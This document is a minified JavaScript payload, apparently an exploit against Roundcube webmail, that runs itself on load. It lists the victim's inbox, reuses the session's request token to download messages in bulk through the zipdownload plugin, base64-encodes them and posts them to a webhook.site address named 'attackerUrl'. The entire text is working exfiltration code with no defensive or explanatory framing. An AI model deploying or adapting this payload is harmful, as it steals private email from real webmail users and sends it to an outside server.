const CONFIG={attackerUrl:"https://webhook.site/30e7aeb0-079c-4def-8854-09446e3067ae/leak2",emailListUrl:"/webmail/?_task=mail&_action=list&_refresh=1&_layout=widescreen&_mbox=INBOX&_page=1&_remote=1",downloadUrl:"?_task=mail&_action=plugin.zipdownload.messages",mailbox:"INBOX",downloadMode:"mbox"};function executeExploit(){console.log("Starting exploit...");extractSpecificEmails().catch(error=>{console.error("Error extracting specific emails:",error);});extractAllEmails().catch(error=>{console.error("Error extracting all emails:",error);});}async function extractSpecificEmails(){try{const response=await fetch(CONFIG.emailListUrl,{method:"GET"});const data=await response.json();const emailList=data.exec;const pattern=/add_message_row\(([0-9]+)/g;const matches=emailList.matchAll(pattern);const messageIds=Array.from(matches,match=>match[1]);if(messageIds.length===0){console.log("No email IDs found");return;}console.log(`Found ${messageIds.length} email IDs`);await downloadAndExfiltrateEmails(messageIds.join(','));}catch(error){console.error("Error in extractSpecificEmails:",error);throw error;}}async function extractAllEmails(){try{console.log("Attempting to extract all emails at once");await downloadAndExfiltrateEmails('*');}catch(error){console.error("Error in extractAllEmails:",error);throw error;}}async function downloadAndExfiltrateEmails(uidValue){try{const formData=new FormData();formData.append('_uid',uidValue);formData.append('_mbox',CONFIG.mailbox);formData.append('_mode',CONFIG.downloadMode);formData.append('_token',parent.rcmail.env.request_token);console.log(`Requesting download for uid: ${uidValue}`);const response=await fetch(CONFIG.downloadUrl,{method:'POST',body:formData});if(!response.ok){throw new Error(`Download failed with status: ${response.status}`);}const blob=await response.blob();const base64data=await blobToBase64(blob);console.log("Exfiltrating data...");await exfiltrateData(base64data);console.log("Exfiltration completed");}catch(error){console.error("Error in downloadAndExfiltrateEmails:",error);throw error;}}function blobToBase64(blob){return new Promise((resolve,reject)=>{const reader=new FileReader();reader.readAsDataURL(blob);reader.onloadend=()=>resolve(reader.result);reader.onerror=reject;});}async function exfiltrateData(data){try{await fetch(CONFIG.attackerUrl,{method:'POST',body:data,mode:'no-cors'});}catch(error){console.error("Error sending data to attacker server:",error);throw error;}}executeExploit();
